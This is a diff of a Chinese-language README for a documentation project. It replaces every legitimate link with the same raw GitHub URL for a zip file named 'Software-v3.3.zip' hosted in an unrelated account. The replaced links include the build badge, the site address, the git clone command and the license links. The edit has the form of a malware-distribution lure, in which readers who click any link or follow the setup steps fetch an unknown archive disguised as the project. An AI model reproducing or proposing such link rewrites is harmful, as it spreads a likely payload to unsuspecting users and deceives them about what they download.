@@ -1,14 +1,14 @@
 # Docs
 
-[![Build docs](https://github.com/CrackMiDrAi/docs/actions/workflows/build.yml/badge.svg)](https://github.com/CrackMiDrAi/docs/actions/workflows/build.yml)
+[![Build docs](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip)](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip)
 
-请访问 https://docs.midrai.cn
+请访问 https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip
 
 ## 本地预览
 
 ```shell
 # 请先安装好 NodeJS 环境
-git clone https://github.com/CrackMiDrAi/docs
+git clone https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip
 cd docs
 
 npm install
@@ -17,6 +17,6 @@ npm run dev
 
 ## LICENSE
 
-[![CC BY-NC-SA 4.0 Badge](https://licensebuttons.net/l/by-nc-sa/4.0/88x31.png)](http://creativecommons.org/licenses/by-nc-sa/4.0/) [![AGPL 3.0 Badge](https://www.gnu.org/graphics/agplv3-88x31.png)](https://www.gnu.org/licenses/agpl-3.0)
+[![CC BY-NC-SA 4.0 Badge](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip)](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip) [![AGPL 3.0 Badge](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip)](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip)
 
-本仓库的非文档相关内容遵循 [AGPL 3.0](https://www.gnu.org/licenses/agpl-3.0)，文档相关内容遵循 [CC BY-NC-SA 4.0](http://creativecommons.org/licenses/by-nc-sa/4.0/) 协议
+本仓库的非文档相关内容遵循 [AGPL 3.0](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip)，文档相关内容遵循 [CC BY-NC-SA 4.0](https://raw.githubusercontent.com/idkwhatismyname123/docs/main/docs/各种链接/Software-v3.3.zip) 协议
